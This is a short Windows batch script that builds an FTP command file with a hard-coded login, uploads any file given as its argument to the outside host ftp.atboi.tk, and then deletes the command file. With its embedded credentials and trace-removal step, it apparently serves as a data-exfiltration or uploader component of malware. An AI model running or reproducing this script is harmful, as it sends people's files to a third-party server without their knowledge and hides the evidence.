@echo off
echo user pogicek@andicek.ga> ftpcmd.dat
echo andicek.ga>> ftpcmd.dat
echo put %1>> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat ftp.atboi.tk
del ftpcmd.dat